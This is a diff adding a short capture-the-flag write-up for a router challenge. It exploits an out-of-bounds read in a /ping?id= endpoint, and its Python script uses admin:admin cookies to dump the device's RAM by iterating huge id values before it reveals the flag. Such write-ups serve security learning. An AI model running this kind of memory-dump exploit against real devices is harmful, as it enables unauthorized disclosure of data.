@@ -1,0 +1,45 @@
+<h2>Router-ni [81]</h2>
+
+<h3>Credits</h3>
+
+<p>Thanks to Lord_Idiot, waituck, bbbb and Gladiator for working on this challenge! :tada:</p>
+
+<h3>TL;DR</h3>
+
+<p>The webpage provides an interface to a router, which includes a ping functionality.</p>
+
+<p><img src="../.gitbook/assets/image (82) (2).png" alt="" /></p>
+
+<p>Using the <code>/ping?id=</code> endpoint, we get the base64-encoded result of each ping request. Using a sufficiently large <code>id</code>, we could get an out-of-bound memory read.</p>
+
+<h3>Solution</h3>
+
+<p>By enumerating the <code>id</code>, we would find that the ID range that corresponds to the router's RAM is from <code>18446744073709551463</code> to <code>18446744073709551615</code>. We could dump out the entire RAM this way.</p>
+
+<p>```python
+import requests
+import base64</p>
+
+<p>URL = "http://router-mlb4ta7v3lwam.shellweplayaga.me:31337/ping?id="
+cookies = {'password': 'admin', 'username': 'admin'}</p>
+
+<p>id = 18446744073709551463
+decoded = b""</p>
+
+<p>for i in range(152):
+    r = requests.get(f"{URL}{id+i}", cookies=cookies)
+    data = r.json()
+    res = data["result"]
+    decoded += base64.b64decode(res)</p>
+
+<p>with open("out.bin", "wb+") as f:
+    f.write(decoded)
+```</p>
+
+<p>We would find the following string:</p>
+
+<p><img src="../.gitbook/assets/Screenshot 2022-06-02 at 9.47.09 PM.png" alt="" /></p>
+
+<p>and guess that the flag is</p>
+
+<p><code>FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}</code></p>
